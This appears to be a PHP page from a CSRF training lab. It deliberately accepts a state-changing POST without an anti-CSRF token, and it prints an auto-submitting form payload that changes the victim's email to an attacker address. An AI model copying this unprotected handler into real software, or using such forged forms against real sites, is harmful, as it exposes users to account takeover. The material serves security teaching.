<?php
require_once 'session_helper.php';
$msg = '';
$error = '';

// VULNERABLE: Handles POST requests with absolutely NO anti-CSRF token verification.
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['action']) && $_POST['action'] === 'update_email') {
        if (isset($_POST['email']) && !empty($_POST['email'])) {
            $_SESSION['email'] = $_POST['email'];
            $msg = "Success: Email successfully updated to " . htmlspecialchars($_POST['email']);
        } else {
            $error = "Error: Email parameter is missing.";
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Level 2: Low | CSRF Lab</title>
    <style>
        body { font-family: sans-serif; background-color: #0f172a; color: #f1f5f9; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; }
        .box { background: #1e293b; padding: 30px; border-radius: 12px; max-width: 600px; width: 100%; box-shadow: 0 4px 10px rgba(0,0,0,0.3); border-top: 5px solid #10b981; }
        h1 { color: #10b981; margin-top: 0; }
        code { background: #0f172a; padding: 2px 6px; border-radius: 4px; color: #f43f5e; font-family: monospace; }
        pre { background: #0f172a; padding: 15px; border-radius: 6px; overflow-x: auto; border: 1px solid #334155; }
        .btn { display: inline-block; background-color: #10b981; color: white; padding: 10px 15px; border-radius: 6px; text-decoration: none; font-weight: bold; margin-top: 15px; border: none; cursor: pointer; }
        .btn:hover { background-color: #059669; }
        a.back { color: #94a3b8; text-decoration: none; display: inline-block; margin-top: 20px; }
        a.back:hover { color: #f1f5f9; }
        .status-box { background: #0f172a; padding: 15px; border-radius: 6px; border: 1px solid #334155; margin-bottom: 20px; }
        .status-val { font-weight: bold; color: #38bdf8; }
        .alert { padding: 12px; border-radius: 6px; margin-bottom: 20px; font-weight: bold; }
        .alert-success { background: rgba(16, 185, 129, 0.15); color: #34d399; border: 1px solid #10b981; }
        .alert-danger { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid #ef4444; }
    </style>
</head>
<body>
    <div class="box">
        <h1>Level 2: Low — POST Method State Change</h1>

        <?php if (!empty($msg)): ?>
            <div class="alert alert-success"><?php echo $msg; ?></div>
        <?php endif; ?>
        <?php if (!empty($error)): ?>
            <div class="alert alert-danger"><?php echo $error; ?></div>
        <?php endif; ?>

        <!-- Active Session Status -->
        <div class="status-box">
            <p style="margin: 0 0 5px 0; font-size: 0.85rem; color: #94a3b8; text-transform: uppercase;">Current Victim Profile Status</p>
            <div>User: <span class="status-val"><?php echo htmlspecialchars($_SESSION['user']); ?></span></div>
            <div>Email: <span class="status-val"><?php echo htmlspecialchars($_SESSION['email']); ?></span></div>
        </div>

        <p>The developer realized that GET requests shouldn't alter state and correctly changed the endpoint handling to <code>POST</code>. However, they forgot to enforce an anti-CSRF token verification check. Since POST requests can be initiated cross-origin via HTML forms, this remains completely vulnerable.</p>
        
        <h3>Source Code Snippet:</h3>
        <pre><code>&lt;?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($_POST['action'] === 'update_email') {
        $_SESSION['email'] = $_POST['email'];
    }
}
?&gt;</code></pre>

        <h3>Your Goal:</h3>
        <p>Deliver a POST request on behalf of the victim. Because you cannot trigger a POST request using simple img tags, you must craft an external HTML document that contains a form and submits it automatically via JavaScript:</p>
        <pre><code>&lt;form action="http://localhost:8080/csrf-lab/level2.php" method="POST" id="csrfForm"&gt;
    &lt;input type="hidden" name="action" value="update_email"&gt;
    &lt;input type="hidden" name="email" value="attacker@evil.local"&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById('csrfForm').submit();&lt;/script&gt;</code></pre>

        <form action="level2.php" method="POST" style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #334155;">
            <input type="hidden" name="action" value="update_email">
            <label for="email">Update Email (Legitimate Flow):</label><br>
            <input type="email" id="email" name="email" value="alice@securesite.local" style="width: 100%; padding: 10px; margin-top: 5px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: white;" required><br>
            <input type="submit" value="Update Email" class="btn">
        </form>

        <br>
        <a href="index.php" class="back">⬅️ Back to Dashboard</a>
    </div>
</body>
</html>
